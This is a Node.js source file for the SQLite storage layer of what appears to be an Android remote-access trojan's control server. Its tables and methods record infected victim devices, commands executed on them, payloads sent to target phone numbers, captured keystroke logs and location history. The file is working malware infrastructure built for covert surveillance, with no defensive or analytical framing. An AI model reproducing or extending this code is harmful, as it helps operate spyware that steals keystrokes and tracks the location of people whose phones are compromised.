const sqlite3 = require('sqlite3');
const { open } = require('sqlite');
const path = require('path');
const fs = require('fs-extra');
const config = require('./config');

class Database {
    constructor() {
        this.db = null;
    }
    
    async init() {
        await fs.ensureDir(path.dirname(config.paths.database));
        
        this.db = await open({
            filename: config.paths.database,
            driver: sqlite3.Database
        });
        
        await this.createTables();
        console.log('✅ Database initialized');
    }
    
    async createTables() {
        // Sessions table
        await this.db.exec(`
            CREATE TABLE IF NOT EXISTS sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT UNIQUE NOT NULL,
                device_name TEXT,
                device_model TEXT,
                android_version TEXT,
                ip_address TEXT,
                country TEXT,
                battery INTEGER,
                status TEXT DEFAULT 'active',
                first_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
                last_seen DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        `);
        
        // Commands table
        await this.db.exec(`
            CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT NOT NULL,
                command TEXT NOT NULL,
                result TEXT,
                status TEXT DEFAULT 'pending',
                executed_at DATETIME,
                FOREIGN KEY (session_id) REFERENCES sessions(session_id)
            )
        `);
        
        // Payloads table
        await this.db.exec(`
            CREATE TABLE IF NOT EXISTS payloads (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                payload_id TEXT UNIQUE NOT NULL,
                filename TEXT,
                target_number TEXT,
                sent_at DATETIME,
                executed BOOLEAN DEFAULT 0,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        `);
        
        // Keylogs table
        await this.db.exec(`
            CREATE TABLE IF NOT EXISTS keylogs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT NOT NULL,
                log_data TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (session_id) REFERENCES sessions(session_id)
            )
        `);
        
        // Location history
        await this.db.exec(`
            CREATE TABLE IF NOT EXISTS locations (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT NOT NULL,
                latitude REAL,
                longitude REAL,
                accuracy REAL,
                captured_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (session_id) REFERENCES sessions(session_id)
            )
        `);
    }
    
    // Session Methods
    async addSession(sessionId, deviceInfo) {
        const stmt = await this.db.prepare(`
            INSERT OR REPLACE INTO sessions 
            (session_id, device_name, device_model, android_version, ip_address, country, battery, status, last_seen)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        `);
        await stmt.run(
            sessionId,
            deviceInfo.name || 'Unknown',
            deviceInfo.model || 'Unknown',
            deviceInfo.android || 'Unknown',
            deviceInfo.ip || '0.0.0.0',
            deviceInfo.country || 'Unknown',
            deviceInfo.battery || 0,
            'active',
            new Date().toISOString()
        );
        await stmt.finalize();
    }
    
    async getActiveSessions() {
        return await this.db.all('SELECT * FROM sessions WHERE status = "active" ORDER BY last_seen DESC');
    }
    
    async updateSession(sessionId, data) {
        await this.db.run('UPDATE sessions SET last_seen = ?, device_name = ? WHERE session_id = ?', 
            new Date().toISOString(), data.device_name || 'Unknown', sessionId);
    }
    
    async killSession(sessionId) {
        await this.db.run('UPDATE sessions SET status = "killed" WHERE session_id = ?', sessionId);
    }
    
    // Command Methods
    async addCommand(sessionId, command, result = null) {
        const stmt = await this.db.prepare(`
            INSERT INTO commands (session_id, command, result, status, executed_at)
            VALUES (?, ?, ?, 'executed', ?)
        `);
        await stmt.run(sessionId, command, result, new Date().toISOString());
        await stmt.finalize();
    }
    
    // Payload Methods
    async addPayload(payloadId, filename, targetNumber) {
        const stmt = await this.db.prepare(`
            INSERT INTO payloads (payload_id, filename, target_number, sent_at)
            VALUES (?, ?, ?, ?)
        `);
        await stmt.run(payloadId, filename, targetNumber, new Date().toISOString());
        await stmt.finalize();
    }
    
    // Keylog Methods
    async addKeylog(sessionId, logData) {
        const stmt = await this.db.prepare(`
            INSERT INTO keylogs (session_id, log_data)
            VALUES (?, ?)
        `);
        await stmt.run(sessionId, logData);
        await stmt.finalize();
    }
    
    async getKeylogs(sessionId, limit = 100) {
        return await this.db.all(`
            SELECT * FROM keylogs WHERE session_id = ? ORDER BY timestamp DESC LIMIT ?
        `, sessionId, limit);
    }
    
    // Location Methods
    async addLocation(sessionId, latitude, longitude, accuracy) {
        const stmt = await this.db.prepare(`
            INSERT INTO locations (session_id, latitude, longitude, accuracy)
            VALUES (?, ?, ?, ?)
        `);
        await stmt.run(sessionId, latitude, longitude, accuracy);
        await stmt.finalize();
    }
    
    // Statistics
    async getStats() {
        const stats = {};
        stats.totalSessions = await this.db.get('SELECT COUNT(*) as count FROM sessions');
        stats.activeSessions = await this.db.get('SELECT COUNT(*) as count FROM sessions WHERE status = "active"');
        stats.totalCommands = await this.db.get('SELECT COUNT(*) as count FROM commands');
        stats.totalKeylogs = await this.db.get('SELECT COUNT(*) as count FROM keylogs');
        stats.totalPayloads = await this.db.get('SELECT COUNT(*) as count FROM payloads');
        return stats;
    }
    
    async close() {
        if (this.db) await this.db.close();
    }
}

module.exports = new Database();
